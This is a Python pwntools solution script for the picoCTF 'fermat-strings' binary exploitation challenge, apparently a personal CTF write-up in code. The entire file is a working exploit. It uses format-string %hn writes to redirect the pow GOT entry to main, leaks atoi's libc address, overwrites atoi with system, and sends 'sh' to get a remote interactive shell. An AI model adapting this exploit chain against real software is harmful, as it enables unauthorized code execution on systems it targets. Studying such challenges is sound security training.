#fermat-strings
import struct
from pwn import *

#####################################################change directory#################################3
level = "fermat-strings"
ip = "mars.picoctf.net:31929"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = True
#####################################setup solution################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/chall")
libc = ELF(dir + "/libc.so.6")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="break *0x400947\nc\nx/24wx 0x601058\n")
    else:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        return process([binary.path])
r = conn()
#################################changing pow to main########################################
already_written = 21
offset = 43
bytes_write = [0x40, 0x0837]
payload = f"%{bytes_write[0]-already_written}c%{offset+1}$hn%{bytes_write[1]-bytes_write[0]}c%{offset}$hn".encode()
address = struct.pack('l', binary.got["pow"]) + struct.pack('l', binary.got["pow"]+2)
r.sendlineafter("A:", b"1_" + payload)
r.sendlineafter("B:", b"1_______" + address)

####################################finding system############################################

payload = f"%{offset}$s".encode()
address = struct.pack("l", binary.got["atoi"])
r.sendlineafter("A:", b"1_" + payload)
r.sendlineafter("B:", b"1_______" + address)
r.recvuntil(b'A: 1_')
atoi_addr = struct.unpack('l', (r.recvuntil(" ").strip().ljust(8, b'\0')))[0]
libc.address = atoi_addr - libc.symbols["atoi"]
system_address = libc.symbols["system"]
log.info("atoi libc address: " + hex(libc.symbols["atoi"]))
log.info("system libc address: " + hex(libc.symbols["system"]))
##################################changing atoi to system########################################

bytes_write = [(system_address >> 32) & 0xffff, (1 << 16) + ((system_address >> 16) & 0xffff), (2 << 16) + (system_address & 0xffff)] 
payload = f"%{bytes_write[0]-already_written}c%{offset+2}$hn%{bytes_write[1]-bytes_write[0]}c%{offset+1}$hn%{bytes_write[2]-bytes_write[1]}c%{offset}$hn".encode()
address = struct.pack('l', binary.got["atoi"]) + struct.pack('l', binary.got["atoi"]+2) + struct.pack('l', binary.got["atoi"]+4)
r.sendlineafter("A:", b"1_" + payload)
r.sendlineafter("B:", b"1_______" + address)
log.info("changed the address of the atoi GOT entry")
##################################final interaction###############################################

r.sendlineafter("A:", "sh")
r.sendlineafter("B:", "0")
r.interactive()